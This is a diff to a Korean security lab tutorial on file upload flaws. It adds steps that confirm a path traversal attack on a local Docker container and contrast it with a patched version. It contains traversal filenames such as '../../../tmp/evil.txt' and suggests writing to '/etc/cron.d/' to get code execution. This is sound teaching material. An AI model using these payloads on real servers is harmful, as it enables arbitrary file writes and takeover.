@@ -53,6 +53,45 @@ curl.exe -F "file=@test.txt;filename=../../../tmp/evil.txt" http://localhost:500
 
 `../` 를 포함한 파일명으로 업로드 폴더를 탈출하여 임의 경로에 파일을 생성할 수 있습니다.
 
+**결과 확인 — docker exec로 컨테이너 내부 확인:**
+
+```powershell
+# 먼저 컨테이너 이름 확인
+docker ps --format "{{.Names}}" | findstr "ch07"
+# Docker Compose v1: ch07-file-upload_vulnerable_1 (밑줄)
+# Docker Compose v2: ch07-file-upload-vulnerable-1 (하이픈)
+
+# 컨테이너 내부의 /tmp 폴더에 evil.txt가 생성되었는지 확인
+# (본인 환경의 컨테이너 이름으로 교체하세요)
+docker exec ch07-file-upload_vulnerable_1 ls -la /tmp/evil.txt
+
+# 파일 내용 확인
+docker exec ch07-file-upload_vulnerable_1 cat /tmp/evil.txt
+# 출력: hello
+
+# 업로드 폴더 외부에 파일이 생성된 것을 확인 — 경로 탐색 공격 성공!
+# 원래 업로드 폴더: /app/uploads/
+# 실제 저장 위치: /tmp/evil.txt (업로드 폴더 탈출)
+```
+
+> **핵심 포인트:** 업로드 폴더(`/app/uploads/`)가 아닌 `/tmp/`에 파일이 저장됨.
+> 공격자가 `../../etc/cron.d/malicious` 같은 경로로 업로드하면 서버에서 악성 코드 실행 가능.
+
+**안전한 버전(5002)에서 동일 공격 시도:**
+
+```powershell
+# 안전한 버전에 같은 공격 시도
+curl.exe -F "file=@test.txt;filename=../../../tmp/evil.txt" http://localhost:5002/upload
+
+# 컨테이너 내부 확인 — /tmp에 파일이 없음
+docker exec ch07-file-upload_secure_1 ls -la /tmp/evil.txt
+# 출력: No such file or directory
+
+# 안전한 버전은 secure_filename()으로 ../를 제거하고 UUID 파일명으로 저장
+docker exec ch07-file-upload_secure_1 ls /app/uploads/
+# 출력: a1b2c3d4-xxxx-xxxx-xxxx.txt (UUID로 변환된 안전한 파일명)
+```
+
 ### 공격 3: MIME 타입 위조
 
 ```powershell
